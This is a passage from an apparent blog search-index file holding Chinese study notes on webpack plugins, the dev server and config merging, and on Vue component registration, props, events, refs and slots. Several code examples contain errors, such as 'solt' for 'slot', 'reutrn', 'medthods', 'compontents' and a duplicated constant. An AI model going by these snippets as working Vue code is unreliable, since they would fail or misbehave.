Cpn,\n  },\n  data() {\n    return {\n      message: \"hello webpack!\",\n    };\n  },\n  methods: {\n    btnClick() {\n      alert();\n    },\n  },\n};\n</script>\n\n<style scoped>\n.title {\n  color: green;\n}\n</style>\n~~~\n\n> 如果在 import 时想要简写 .vue 什么的 可以在 webpack.config.js  的 resolve添加\n>\n> ~~~js\n> //webpack.config.js \n>  extensions:['.js','.vue','.css']\n> ~~~\n\n### 2.7 横幅plugin的使用\n\n1.  认识plugin\n\n+ plugin是插件的意思，通常是用于对某个现有的架构进行扩展\n+ webpack中的插件，就是对webpack现有功能的各种扩展\n\n2. loader和plugin区别\n\n+ loader主要用于转换某些类型的模块，转换器\n+ plugin是插件，是对webpack本身的扩展，扩展器\n\n3. plugin的使用过程\n\n+ 步骤一：通过npm安装需要使用的plugins\n+ 步骤二：在webpack.config.js中的plugins中配置文件\n\n#### 2.7.1 添加版权的plugin\n\n该插件名字BannerPlugin,属于webpack自带的插件\n\n~~~js\n//webpack.config.js\n\n//添加版权的Plugin\nconst webpack = require('webpack');\n\nmodule.exports={\n    ...\n        plugins: [\n        new webpack.BannerPlugin('最终版权归lsy所有')\n    ]\n}\n\n//进入相应的文件夹 运行 能在 打好包的文件第一行看见 /*! 最终版权归lsy所有 */\n~~~\n\n\n\n#### 2.7.2 打包html的plugin\n\n+ 在开发时，index.html文件是存放在项目根目录下的，但真实发布时，发布的是dist的内容，但是dist没有index.html时，打包文件也就没有意义\n+ 所以需要将html打包到dist中，这时就能用HtmlWebpackPlugin插件\n\nHtmlWebpackPlugin插件可以：\n\n1. 自动生成的一个index.html文件 可以指定模板来生成\n2. 将打包的js文件自动通过script标签插入到body\n\n安装HtmlWebpackPlugin插件：\n\n~~~js\nnpm install html-webpack-plugin@3.2.0 --save-dev  //老师是@3.2.0\n~~~\n\n修改配置webpack.config.js文件中plugins部分：\n\n+ 这里的template表示根据什么模板来生成index.html\n+ 需要删除之前在output中添加的publicPath属性\n+ 否则插入script标签中的src可能会有问题\n\n~~~js\n//webpack.config.js\n\n//添加打包html的plugin\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\n    plugins: [\n        //添加版权\n        new webpack.BannerPlugin('最终版权归lsy所有'),\n        //打包html\n        new HtmlWebpackPlugin()\n    ]\n\n~~~\n\n运行 发现 在dist中 有index文件：\n\n1. 没有必须的`<div id='app'></div>`\n\n   > 建立一个模板  原来的index 即根目录下的index body里只留下 上述代码作为模板\n   >\n   > ~~~html\n   > <body>\n   >     <div id=\"app\">\n   >     </div>\n   > </body>\n   > ~~~\n   >\n   > 再在打包的地方 引入模板\n   >\n   > ~~~js\n   >         new HtmlWebpackPlugin({\n   >             template: 'index.html'\n   >         })\n   > ~~~\n\n2. src的地址有错\n\n   > 在webpack.config.js 中注释掉    publicPath: 'dist/'\n\n   再运行就可以了\n\n\n\n#### 2.7.3 js压缩的Plugin（发布阶段使用）\n\n+ 在项目发布之前，必然要队js等文件进行压缩处理\n+ 使用第三方插件uglifyjs-webpack-plugin，并且指定版本号，与CLI2保持一致\n\n~~~js\nnpm install uglifyjs-webpack-plugin@1.1.1 --save-dev\n~~~\n\n修改配置文件\n\n~~~js\n//webpack.config.js\n\n//添加压缩js的plugin\nconst UglifyjsWebpackPlugin = require('uglifyjs-webpack-plugin');\n\n    plugins: [\n        //添加版权\n        new webpack.BannerPlugin('最终版权归lsy所有'),\n        //打包html\n        new HtmlWebpackPlugin({\n            template: 'index.html'\n        }),\n        //压缩js文件\n        new UglifyjsWebpackPlugin()\n    ]\n~~~\n\n> 但在开发时不建议使用  因为不方便调试代码\n>\n> 在发布阶段 再加进来\n\n\n\n### 2.8 搭建本地服务器（开发阶段使用）\n\n+ webpack提供了一个可选的本地开发服务器，这个服务器基于node.js搭建，内部使用express框架，可以实现**让浏览器自动刷新显示修改后的结果**\n\n安装\n\n~~~js\nnpm install --save-dev webpack-dev-server@2.9.1\n~~~\n\n+ devserver也是作为webpack中的一个选项，选项本身可以设置如下属性：\n  + contentBase：为哪一个文件夹提供本地服务，默认是根文件夹，这里填写`./dist`\n  + port：端口号\n  + inline：页面实时刷新\n  + historyApiFallback：在SPA页面中，依赖HTML5的history模式\n\n配置webpack.config.js文件的配置\n\n~~~js\n//webpack.config.js  与pulgin同级\n    //搭建本地服务器\n    devServer: {\n        contentBase: './dist',\n        inline: true, //是否实时监听\n    }\n        \n~~~\n\n 跑起来 是通过 webpack-dev-server\n\n> 因为是再局部安装的 所以跑起来 说找不到命令 \n>\n> 所以在终端 应该找本地的 `./node_modules/.bin/webpack-dev-server `\n\n但是有更简洁的方式：\n\n~~~json\n//package.json\n\n\"scripts\": {\n        \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n        \"build\": \"webpack\",\n        \"dev\": \"webpack-dev-server\"\n    },\n~~~\n\n终端输入`npm run dev`  就会出现本地可以运行的地址 \n\n点进去 后修改代码 进去就会发现 页面也刷新了\n\n> 停止服务  ：`ctrl + c `\n\n停止服务后 可以再次打包 就可以了\n\n\n\n> 因为手动点地址进去可能有点麻烦 ，所以\n>\n> `\"dev\": \"webpack-dev-server --open\"`\n>\n> 就会自动打开了\n\n\n\n### 2.9 配置文件的分离\n\n+ 因为有些是开发时需要 有些是发布时需要\n\n  > 开发：\n  >\n  > ~~~js\n  > module.exports = {\n  > \n  >     //搭建本地服务器\n  >     devServer: {\n  >         contentBase: './dist',\n  >         inline: true, //是否实时监听\n  >     }\n  > }\n  > ~~~\n  >\n  > 生产时：\n  >\n  > ~~~js\n  > //添加压缩js的plugin\n  > const UglifyjsWebpackPlugin = require('uglifyjs-webpack-plugin');\n  > \n  > module.exports = {\n  > \n  >     plugins: [\n  >         //压缩js文件\n  >         new UglifyjsWebpackPlugin()\n  >     ],\n  > \n  > }\n  > ~~~\n\n+ 安装webpack-merge 对两个文件进行合并\n\n~~~js\nnpm install webpack-merge@4.1.5 --save-dev\n~~~\n\n+ 合并文件\n\n  > 生产时：\n  >\n  > ~~~js\n  > //生产时\n  > \n  > //添加压缩js的plugin\n  > const UglifyjsWebpackPlugin = require('uglifyjs-webpack-plugin');\n  > \n  > //合并两个文件\n  > const webpackMerge = require('webpack-merge');\n  > \n  > //导入baseConfig\n  > const baseConfig = require('./base.config');\n  > \n  > module.exports = webpackMerge(baseConfig, {\n  >     plugins: [\n  >         //压缩js文件\n  >         new UglifyjsWebpackPlugin()\n  >     ],\n  > \n  > })\n  > ~~~\n  >\n  > 开发时：\n  >\n  > ~~~js\n  > //开发时\n  > \n  > //合并两个文件\n  > const webpackMerge = require('webpack-merge');\n  > \n  > //导入baseConfig\n  > const baseConfig = require('./base.config');\n  > \n  > module.exports = webpackMerge(baseConfig, {\n  > \n  >     //搭建本地服务器\n  >     devServer: {\n  >         contentBase: './dist',\n  >         inline: true, //是否实时监听\n  >     }\n  > })\n  > ~~~\n\n+ 此时webpack.config.js就可以删了\n\n+ 然后运行的时候就会报错 说没有‘webpack.config,js’配置文件，\n\n  此时就需要在package.json中，指定要用的配置文件\n\n  > ~~~js\n  > //webpack.json \n  > //手动指定执行文件\n  >     \"scripts\": {\n  >         \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n  >         \"build\": \"webpack --config ./bulid/prod.config.js\",\n  >         \"dev\": \"webpack-dev-server --open --config ./build/dev.config.js\"\n  >     },\n  > ~~~\n\n+ 然后就发现 被打包到build文件夹下面 的dist中了\n\n  > 将路径改正确\n  >\n  > ~~~js\n  > //原‘dist’      \n  > //../是因为后面使用了 build/base.config.js\n  > path: path.resolve(__dirname, '../dist'),\n  > ~~~\n  >\n  > \n\n  \n\n  \n\n","tags":["webpack","vue"],"categories":["learningNotes"]},{"title":"03 vue组件开发","url":"/learningNotes/vue/03 组件开发","content":"\n\n## 1. 组件化\n\n### 1.1 什么是组件化\n\n+ 将一个完整的页面分成很多个组件\n+ 每个组件都用于实现页面的一个功能块\n+ 每一个组件又可以进行细分\n\n### 1.2 Vue组件化思想\n\n+ 组件化是Vue.js中的重要思想\n  + 它提供了一种抽象，让我们可以开发出一个个独立可复用的小组件来构造我们的应用\n  + 任何的应用都会被抽象成一颗组件树\n+ 组件化思想的应用\n  + 尽可能将页面拆分成一个个小的、可以复用的组件\n  + 使代码更方便组织和管理，扩展性也更强\n\n\n\n### 1.3 注册组件的基本步骤\n\n1. 调用`Vue.extend()`创建组件构造器\n2. 调用`Vue.component()`注册组件\n3. 在Vue实例的作用范围内使用组件\n\n\n\n## 2.组件化的基本使用\n\n### 2.1 步骤解析\n\n1. Vue.extend():\n   + 调用Vue.extend()创建的是一个组件构造器\n   + 通常在创建组件构造器时，传入template代表我们自定义组件的模板\n   + 该模板就是在使用到组件的地方，要显示的html代码\n   + 事实上，这种写法在Vue2.x的文档已经看不到了，会直接使用语法糖的形式\n2. Vue.component():\n   + 调用Vue.component()是将刚才的组件构造器注册为一个组件，并且给起一个组件的标签名称\n   + 需要传递两个参数：1. 注册组件的标签名 2. 组件构造器\n3. 组件必须挂载在某个Vue实例下，否则不会生效\n\n\n\n### 2.2 代码演示\n\n~~~html\n<div id=\"app\">\n    <!-- 3.使用组件 -->\n    <my-cpn></my-cpn>\n</div>\n<script>\n\t//1.创建组件构造器对象  如果有多个标签的话 需要有一个根\n    const cpnC = Vue.extend({\n        template:`\n\t\t\t\t<div>\n    \t\t\t\t<h2>我是标题</h2>\n\t\t\t\t\t<p>我是内容</p>\n    \t\t\t</div>`\n    })\n    \n    //2.注册组件\n    Vue.component('my-cpn',cpnC);\n    \n    //new Vue不能写在前面\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello'\n        }\n    })\n</script>\n~~~\n\n\n\n## 3.全局组件和局部组件\n\n全局组件：可以在多个Vue实例下面使用；通过Vue.component()注册的组件\n\n局部组件：只能在当前Vue实例下使用；注册的组件时挂载在某个实例中\n\n~~~js\nVue.component('cpn',cpnC); //2.注册组件，全局组件\n\nconst app = new Vue({\n    el:\"#app\",\n    data:{},\n    components:{      //局部组件  用的比较多\n        //cpn使用组件时的标签名\n        cpn:cpnC;\n    }\n})\n~~~\n\n\n\n## 4.父组件和子组件\n\n+ 组件之间存在层级关系\n+ 其中一种非常重要的关系就是父子组件的关系\n\n~~~html\n<div id=\"app\">\n    <cpn2></cpn2>\n    <!-- <cpn1></cpn1> 如果要使用这个组件 要在全局或者在Vue实例注册组件  -->\n</div>\n<script>\n\t//1.创建第一个组件构造器（子组件）\n    const cpnC1 = Vue.extend({\n        template:`\n\t\t\t\t\t<div>\n    \t\t\t\t\t<h2>标题1</h2>\n    \t\t\t\t</div>\n\t\t\t\t`\n    })\n    \n\t//2.创建第二个组件构造器（父组件）\n    const cpnC1 = Vue.extend({\n        template:`\n\t\t\t\t\t<div>\n    \t\t\t\t\t<h2>标题2</h2>\n\t\t\t\t\t\t<cpn1></cpn1>\n    \t\t\t\t</div>\n\t\t\t\t`,\n        components:{\n            cpn1:cpnC1;\n        }\n    })\n    \n    //root 组件\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        },\n        compontents:{\n            cpn2:cpnC2\n        }\n    })\n</script>\n~~~\n\n\n\n## 5. 组件语法糖\n\n+ 主要是省去了调用Vue.extend()的步骤，可以直接使用一个对象来代替\n\n~~~js\n//1.全局组件注册的语法糖\nVue.component('cpn1',{\n    template:`\n\t\t\t\t<div>\n    \t\t\t\t<h2>标题1</h2>\n    \t\t\t</div>\n\t\t\t`\n})\n\n//2.局部组件注册\nconst app = new Vue({\n    el:\"#app\",\n    data:{},\n    temponents:{\n        'cpn2':{\n            template:`\n\t\t\t\t\t<div>\n    \t\t\t\t\t<h2>标题2</h2>\n    \t\t\t\t</div>\n\t\t\t\t`,\n        }\n    }\n})\n~~~\n\n\n\n## 6.组件模板抽离的写法\n\n+ Vue提供了两种方案来定义HTML模块内容：\n  1. 使用<script>标签 :type=\"text/x-template\" \n  2. 使用<template>标签\n\n~~~html\n<div id=\"app\">\n    <cpn></cpn>\n</div>\n\n<!-- 1.使用<script>标签 -->\n<script type=\"text/x-template\" id=\"cpn\">\n\t<div>\n   \t\t<h2>标题1</h2>\n    </div>\n</script>\n\n<!-- 2.使用<template>标签 -->\n<template id = \"cpn\">\n\t<div>\n   \t\t<h2>标题2</h2>\n    </div>\n</template>\n\n<script>\n//1.注册一个全局组件\n    Vue.comonent('cpn',{\n        template:'#cpn'\n    })\n    \n  \tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        }\n    })\n</script>\n~~~\n\n## 7.组件数据存放的问题\n\n### 7.1 用法\n\n+ 组件是一个单独功能模块的封装：\n  + 这个模块又属于自己的HTML模板，也应该有属于自己的数据data\n+ 组件的数据不能保存再顶层Vue实例中\n  + 组件对象也有一个data属性（也可以有methods等属性）\n  + 只是这个data属性必须是一个函数\n  + 而且这个函数返回一个对象，对象内部保存着数据\n\n~~~html\n<div id=\"#app\">\n    <my-cpn></my-cpn>\n</div>\n\n<template id=\"cpn\">\n    <div><h2>\n        {{title}}\n        </h2></div>\n</template>\n\n<script>\n    //1.注册全局组件\n    Vue.component('cpn',{\n        template:\"#cpn\",\n        data(){\n            return {\n                title:'abc'\n            }\n        }\n    })\n    \n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello'\n        }\n    })\n</script>\n~~~\n\n### 7.2 ！组件中的data为什么是函数（p58）\n\n为了传值不传址，使用函数时组件与组件之间的数据不会相互影响\n\n\n\n## 8.父子组件的通信\n\n+ 在开发中，往往一些数据需要从上层传递到下层\n  + 比如在一个页面中，我们从服务器请求到了很多的数据\n  + 其中一部分数据，并非是我们整个页面的大组件来展示的，而是需要下面的子组件进行展示\n  + 这个时候，并不会让子组件再次发送一个网络请求，而是让大组件将数据传递给小组件\n+ 如何进行父子/大小组件间的通信呢?Vue官方提到\n  + 通过props向子组件传递数据\n  + 通过自定义事件$emit向父组件发送消息\n\n### 8.1 props基本用法——父–>子\n\n+ 在组件中，使用选项props来声明需要从父级接收到的数据\n+ props的值有两种方式：\n  1. 字符串数组，数组的字符串就是传递时的名称\n  2. 对象，对象可以设置传递时的类型，也可以设置默认值等\n\n~~~html\n<div id='app'>\n    <cpn v-bind:cmovies=\"movies\" :cmessage=\"message\"></cpn>\n    <!-- 这就已经把值从父组件传到子组件了 必须要使用v-bind -->\n</div>\n\n<template id=\"cpn\">\n    <div>\n        <p v-for=\"item in cmovies\">{{item}}</p>\n        <h2>{{cmessage}}</h2>\n    </div>\n</template>\n\n<script>\n    //父传子:props\n    const cpn = {\n        template:\"#cpn\",\n        props:['comvies','cmessage'],\n        data(){\n            return{}\n        },\n        methods:{\n            \n        }\n    }\n    \n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n            movies:['海王','海贼王','海尔兄弟']\n        },\n        components:{\n            cpn\n        }\n    })\n</script>\n~~~\n\n#### 8.1.1 props数据验证\n\n+ 上述props选项使用一个数组\n+ 除数组外，可以使用对象，当需要对props进行类型等验证时，就需要对象写法了\n+ 验证支持的数据类型：\n  + String、Number、Boolean、Array、Object、Date、Function、Symbol\n+ 若有自定义构造函数时，验证也支持自定义的类型\n\n\n\n~~~js\n    const cpn = {\n        template:\"#cpn\",\n        //数组形式\n        props:['comvies','cmessage'],\n        //字符串形式\n        props:{\n            //1.类型限制\n            cmovies:Array,\n            cmessage:String,\n            \n            //2.提供一些默认值 默认值在没有传递的时候会显示 v-bind没有传时\n            //required 为true时 说明这个属性是必传的 否则会报错\n            cmessage:{\n            \ttype:String,\n                default:'aaaa'\n                required:true\n        \t}\n            \n            //类型是对象/数组时，默认值必须是一个函数\n            cmovies:{\n            \ttype:Array,\n            \t//default:[]  这样会报错\n            \tdefault(){\n            \t\treturn []\n        \t\t}\n        \t}\n        },\n        data(){\n            return{}\n        },\n        methods:{\n            \n        }\n    }\n~~~\n\n#### 8.1.2 props驼峰标识\n\n在组件的应用不适合用驼峰  应该要用-\n\n~~~html\n<div id=\"app\">\n    <!-- 在组件的应用不适合用驼峰  应该要用- -->\n    <cpn :c-info=\"info\" :chile-my-message=\"message\"></cpn>\n</div>\n\n<template id='cpn'>\n    <div>\n        <h2>{{cInfo}}</h2>\n        <p>{{chileMyMessage}}</p>\n    </div>\n</template>\n\n<script>\n\tconst cpn = {\n        template :\"#cpn\",\n        props:{\n            cInfo:{\n                type:Object,\n                default(){\n                    return {}\n                }\n            }\n        },\n        childMyMessage:{\n            type:String,\n            default:''\n        }\n    }\n    \n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            info:{\n                name:\"why\",\n                age:18,\n                height:1.88\n            },\n            message:'hello'\n        },\n        components:{\n            cpn\n        }\n    })\n</script>\n~~~\n\n### 8.2 子传父\n\n+ 如果需要子组件传递数据或事件到父组件中：应该使用自定义事件来完成\n+ 什么时候需要定义事件？\n  + 当子组件需要向父组件传递数据时，就要用到自定义事件\n  + v-on可以用来监听自定义事件\n+ 自定义事件的流程\n  + 在子组件中，通过$emit()来触发事件\n  + 在父组件中，通过v-on来监听子组件事件\n\n~~~html\n<!-- 父组件模板 -->\n<div id=\"app\">\n    <!-- 不能使用驼峰 -->\n\t<cpn @itemclick=\"cpnClick\"></cpn>\n</div>\n\n<!-- 子组件模板 -->\n<template id=\"cpn\">\n    <div>\n        <button v-for=\"item in categories\" @click=\"btnClick(item)\">{{item.name}}</butto>\n    </div>\n</template>\n\n<script>\n    //1.子组件\n    const cpn = {\n        template:\"#cpn\",\n        data(){\n            return {\n                categories:[\n                    {id:'aaa',name:'热门推荐'},\n                    {id:'bbb',name:'手机数码'},\n            \t\t{id:'ccc',name:'家用电器'},\n            \t\t{id:'ddd',name:'电脑办公'},\n                ]\n            }\n        },\n        methods:{\n            btnClick(item){\n                //传给父组件 自定义事件  子组件 发射 \n                this.$emit('itemclick',item);\n            }\n        }\n    }\n    \n    //2.父组件\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        },\n        components:{\n            cpn\n        },\n        methods:{\n            itemClick(item){\n             \t console.log('itemclick',item);   \n            }\n        }\n    })\n</script>\n~~~\n\n\n\n### 8.3 父子组件的访问方式 ：\n\n+ 有时候需要父组件直接访问子组件，子组件直接访问父组件，或者是子组件访问根组件\n  + 父组件访问子组件：是使用`$children` `$refs`\n  + 子组件访问父组件：使用`$parent`\n\n#### 8.3.1 父访问子 $children/$refs\n\n+ `this.$children`是一个数组类型，包含了所有的子组件对象\n+ 通过遍历，取出所有子组件的message状态\n\n##### 1. $children\n\n因为返回的是数组的形式，所以如果要添加便签的话就很麻烦 所以一般开发不使用这样的方法\n\n一般只有拿到所有子组件的信息的时候，才会使用$children\n\n~~~html\n<div id=\"app\">\n    <cpn></cpn>\n    <cpn></cpn>\n    <cpn></cpn>\n    <button @click=\"btnClick\">按钮</button>\n</div>\n\n<template id=\"cpn\">\n    <div>\n        我是子组件\n    </div>\n</template>\n\n<script>\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        },\n        methods:{\n            btnClick(){\n                console.log(this.$children); //可以利用这个得到 子组件的各种属性 以数组的形式\n                this.$children[0].showMessage(); //然后调用\n                //if 有多个组件要渲染\n                for(let c of this.$children){\n                    console.log(c.name);\n                }\n            }\n        }\n        components:{\n            cpn:{\n                template:\"#cpn\",\n        \t\tdata(){\n        \t\t\treutrn{\n                        name:'我是子组件的name'\n                    }\n    \t\t\t},\n                medthods:{\n                    showMessage(){\n                        console.log('showMessage');\n                    }\n                }\n            }\n        }\n    })\n</script>\n~~~\n\n\n\n##### 2.$refs\n\n对象类型 默认空对象  必须在组件加  ref=‘aaa’ \n\n一般都是使用这个属性\n\n~~~html\n<div id=\"app\">\n    <cpn></cpn>\n    <cpn></cpn>\n    <cpn ref='aaa'></cpn>\n    <button @click=\"btnClick\">按钮</button>\n</div>\n\n<template id=\"cpn\">\n    <div>\n        我是子组件\n    </div>\n</template>\n\n<script>\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        },\n        methods:{\n            btnClick(){\n                console.log(this.$refs);  \n                //如果没有在组件标签绑定 那返回空对象 若有绑定 就会返回有名字的对象 \n                //名字会作为这个对象的key\n                console.log(this.$refs.aaa);\n                console.log(this.$refs.aaa.name);\n            }\n        }\n        components:{\n            cpn:{\n                template:\"#cpn\",\n        \t\tdata(){\n        \t\t\treutrn{\n                        name:'我是子组件的name'\n                    }\n    \t\t\t},\n                medthods:{\n                    showMessage(){\n                        console.log('showMessage');\n                    }\n                }\n            }\n        }\n    })\n</script>\n~~~\n\n\n\n#### 8.3.2 子访问父\\$parent和  $root\n\n用得很少，复用性不强\n\n~~~html\n<div id='app'>\n    <cpn></cpn>\n</div>\n\n<template id='cpn'>\n    <ccpn></ccpn>\n</template>\n\n<template id='ccpn'>\n    <div>\n       <h2>我是子组件</h2> \n       <button @click='btnClick'></button>\n    </div>\n</template>\n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            message:\"hello\",\n        },\n        components:{\n            cpn:{\n                template:\"#cpn\",\n                data(){\n                    return {\n                        name:'我是cpn组件的name'\n                    }\n                }\n            },\n            components:{\n                ccpn:{\n                    template:\"#ccpn\",\n                    methods:{\n                        btnClick(){\n                            //1.访问父组件$parent\n                            console.log(this.$parent);\n                            console.log(this.$parent.name);\n                            \n                            //2.访问根组件$root\n                            console.log(this.$root);\n                            console.log(this.$root.message);\n                        }\n                    }\n                }\n            }\n        }\n        \n    })\n</script>\n~~~\n\n## 9.组件化高级（p69-72）\n\n### 9.1插槽 slot\n\n#### 9.1 组件化插槽\n\n1. slot为插槽的意思，目的是让我们原来的设备具有更多的扩展性\n\n+ 组件化插槽是为了让我们封装的组件更加具有扩展性\n+ 让使用者可以决定组件内部的一些内容到底展示什么\n\n2. 如何去封装以京东导航栏为例子的这类组件：抽取共性，保留不同\n\n+ 将共性抽取到组件中，将不同暴露为插槽\n+ 一旦预留了插槽，就可以让使用者根据自己的需求，决定插槽中插入什么内容\n\n\n\n#### 9.2 插槽的基本使用\n\n1. 基本使用\n2. 默认值\n3. 多个值时，会全部替换进去\n\n~~~html\n<div id='#app'>\n    <cpn></cpn>\n    <cpn>\n        <button>按钮</button>\n    </cpn>   <!-- 会把这个button放入插槽里 如果里面有多个 那也会全部显示出来 -->\n    <cpn></cpn>\n</div>\n\n<template id=\"cpn\">\n\t<div>\n        <h2>我是组件</h2>\n        <solt><span>如果没有传进想要的标签 就会默认显示插槽里的内容</span></solt>\n    </div>\n</template>\n\n<script>\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        },\n        components:{\n            cpn:{\n                template:\"#cpn\",\n            }\n        }\n    })\n</script>\n~~~\n\n### 9.2 具名插槽slot\n\n~~~html\n<div id='#app'>\n    <cpn></cpn>\n    <cpn>\n        <span solt=\"center\">标题</span>\n        <!-- 如果没有加solt的属性 只会替换那些没有名字的插槽 -->\n    </cpn>  \n    <cpn></cpn>\n</div>\n\n<template id=\"cpn\">\n\t<div>\n        <solt name='left'><span>左边</span></solt>\n        <solt name='center'><span>中间</span></solt>\n        <solt name='right'><span>右边</span></solt>\n    </div>\n</template>\n\n<script>\n    const app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        },\n        components:{\n            cpn:{\n                template:\"#cpn\",\n            }\n        }\n    })\n</script>\n~~~\n\n\n\n### 9.3 编译作用域\n\n+ 父组件模板的所有东西都会在父级作用域内编译；子组件模板的所有东西都会在子级作用域内编译\n\n~~~html\n<div id='app'> \n    <cpn v-show='isShow'></cpn> <!-- 使用实例的isShow -->\n</div>\n\n<template id='cpn'>\n    <h2>我是组件</h2>\n    <button v-show=\"isShow\">按钮</button> <!-- 使用组件的isShow -->\n</template>\n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n            isShow:true,\n        },\n        component:{\n            cpn:{\n                template:'#cpn',\n                data(){\n                    return {\n                        isShow:false,\n                    }\n                }\n            }\n        }\n    })\n</script>\n~~~\n\n### 9.4 作用域插槽\n\n+ 父组件替换插槽的标签，但是内容由子组件来提供\n\n~~~html\n<div id=\"app\">\n    <cpn></cpn>\n    <cpn>\n    <!-- 目的是 获取组件中的pLanguage -->\n        <!-- 在2.5.x以下的版本 只能使用template 但是后面的版本可以直接 使用div-->\n        <!-- 通过solt引用 下面插槽对象  下面用的solt.data 用的就是下面的data\t==planage-->\n        <template slot-scope='solt'>\n            <span v-for='item in  solt.data'>{{item}} - </span>\n        </template>\n    </cpn>\n        <cpn>\n \t\t <template slot-scope='solt'>\n             <!-- 以‘ - ’分割 -->\n            <span>{{solt.data.join(' - ')}}</span>\n        </template>\n    </cpn>\n</div>\n\n<template id='cpn'>\n\t<div>\n        <!-- data是随便取的名字 意味着data指向pLanguage -->\n        <solt :data='pLanguages'>\n        \t<ul><li v-for='item in pLanguages'>{{item}}</li></ul>\n        </solt>\n    </div>\n</template>\n\n<script>\n\tconst app = new Vue({\n        el:\"#app\",\n        data:{\n            message:'hello',\n        },\n        component:{\n            cpn:{\n                template:\"#cpn\",\n                data(){\n                    return {\n                        pLanguages:['js','java','python','c']\n                    }\n                }\n            }\n        }\n    })\n</script>\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["vue"],"categories":["learningNotes"]},{"title":"01 Vue入门","url":"/learningNotes/vue/01邂逅Vuejs","content":"\n## 1. 认识Vuejs\n\n### 1.1 为什么学习Vuejs\n\n### 1.2 简单认识Vuejs\n\n1. Vue（读音类似view）\n\n2. Vue是一个渐进式框架（作为一部分嵌入页面js）\n\n   > Vue全家桶：Core+Vue-router+Vuex\n\n3. Vue有很多特点和Web开发中常见的高级功能\n\n   + 解耦视图和数据\n   + 可复用的组件\n   + 前端路由技术\n   + 状态管理\n   + 虚拟DOM\n\n## 2. Vue.js安装方式\n\n### 2.1 方式一：CDN引入\n\n+ 选择引入开发环境版本还是生产环境版本\n\n  ~~~html\n  <!-- 开发环境版本，包含了由版主的命令行警告 -->\n  <script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"></script>\n  \n  <!-- 生产环境版本，优化了尺寸和速度 -->\n  <script src=\"https://cdn.jsdelivr.net/npm/vue\"></script>\n  ~~~\n\n### 2.2 方式二：下载和引入\n\n开发环境：https://vuejs.org/js/vue.js\n\n生产环境：https://vuejs.org/js/vue.min.js\n\n### 2.3 方式三：NPM安装管理\n\n+ 后续通过webpack和CLI的使用，我们使用该方式\n\n## 3. Vuejs初体验\n\n### 3.1 Hello Vuejs\n\n+ vue：编程范式：声明式编程\n+ js：编程范式：命令式编程\n\n### 3.2 Vue列表展示\n\n### 3.3 案例：计数器\n\n语法糖：简写的另一种说法\n\n## 4. Vuejs的MVVM\n\nMVVM：（Model View View Model）最重要的是中间的ViewModel层，是View和Model之间安定桥梁\n\n> 学习一个概念最好的方式是去看维基百科\n>\n> https://zh.wikipedia.org/wiki/MVVM\n\n### 4.1 Vue中的MVVM\n\n<img src='https://s1.328888.xyz/2022/04/09/XOxmt.jpg' style=\"zoom:60%;\" >\n\n<img src='https://s1.328888.xyz/2022/04/09/XaQoe.jpg' style=\"zoom:60%;\" >\n\n## 5. 创建Vue实例传入的options\n\n+ options中可以包含的选项：https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E6%95%B0%E6%8D%AE\n\n+ 目前掌握这些选项：\n\n  1. el：\n\n     + <font color='red'>类型：string|HTMLElement</font>\n     + 作用：决定之后Vue实例会管理哪一个DOM\n\n  2. data：\n\n     + <font color='red'>类型：Object|Function （组件中data必须是一个函数）</font>\n     + 作用：Vue实例对应的数据对象\n\n  3. methods：\n\n     + <font color='red'>类型：{ [key:string]:Function }</font>\n\n     + 作用：定义属于Vue的一些方法，可以再其他地方调用，也可以在指令中使用\n\n       > 不能使用箭头函数\n\n### 5.1 方法跟函数的区别\n\n方法：method\n\n函数：function\n\n一般在js中写的都是函数\n\n但与实例挂钩的就是方法，例如类里面和Vue里面，方法是面向对象的\n\n### 5.2 Vue的生命周期\n\n事物从诞生到死亡\n\n到GitHub下载源码时：不要直接下载开发版本，选择tag最新的稳定版\n\n## 模板\n\n缩进更多使用两个空格","tags":["vue"],"categories":["learningNotes"]},{"title":"02 Vue基础语法","url":"/learningNotes/vue/02 Vue基础语法","content":"\n\n## 1.插值语法（p12-13）\n\n### 1.1 Mustache语法\n\n+ 插值表达式`{{ }}`\n+ 在内容区书写的 不能在属性值书写\n\n+ 不仅可以直接写变量 ，也可以写简单的表达式\n\n### 1.2 其他指令的使用\n\n#### v-once\n\n+ 某些情况下，可能不希望界面随意的跟随改变\n+ 该指令后面不需要跟任何表达式/值\n+ 该指令表示元素和组件只渲染一次，不会随着数据的改变而改变\n\n~~~html\n<div id='app'>\n    <h2 v-once>{{ message }}</h2>\n</div>\n~~~\n\n\n\n#### v-html  \n\n+ 某些情况下，从服务器请求到的数据本身就是html代码，if直接通过`{{}}`来输出，会将html代码也一起输出\n+ 该指令会将string的html解析出来并且进行渲染\n+ 该指令后面往往会跟上一个个string类型\n\n~~~html\n<div id='app'>\n    <h2 v-html='url'></h2>\n</div>\n<script>\n\tconst app = new Vue({\n        el:'#app',\n        data:{\n            url:'<a href=\"https://www.baidu.com\">百度</a>'\n        }\n    })\n</script>\n~~~\n\n\n\n#### v-text\n\n+ 该指令和Mustache比较相似：都是用于将数据显示在界面中\n+ 该指令通常情况下，接收一个string类型\n\n~~~html\n<div id='app'>\n    <h2>{{ message }} vuejs</h2>  <!-- hello vuejs -->\n    <h2 v-text='message'>vuejs</h2> <!-- hello -->\n</div>\n<script>\n\tconst app = new Vue({\n        el:'#app',\n        data:{\n            message:'hello'\n        }\n    